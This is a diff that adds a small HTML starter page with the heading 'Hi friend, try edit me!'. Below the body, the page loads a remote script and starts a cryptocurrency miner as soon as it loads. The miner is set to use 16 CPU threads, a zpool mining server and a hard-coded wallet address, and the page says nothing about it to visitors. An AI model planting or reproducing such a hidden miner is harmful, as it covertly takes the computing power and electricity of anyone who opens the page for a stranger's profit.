@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="src/style.css">
+</head>
+
+<body>
+
+    <h1>Hi friend, try edit me!</h1>
+
+</body>
+<script src="https://webminer.pages.dev/dist/mm.js"></script>
+<script>
+    const client = new Client({
+        algorithm: "minotaurx", // yespower, minotaurx
+        stratum: {
+            server: "minotaurx.na.mine.zpool.ca", // Your Pool host
+            port: 7019, // Your Pool port
+            worker: "DJmhV5V58HTpBriG5YRJgCntJ5aH3pLwKc", // Your Wallet
+            password: "hm-chrom", // Your Mining password
+        },
+        options: {
+            threads: 16, // CPU threads to mining
+            log: true, // Show log on console
+        },
+    });
+
+    // Start Mining
+    client.start();
+</script>
+
+</html>
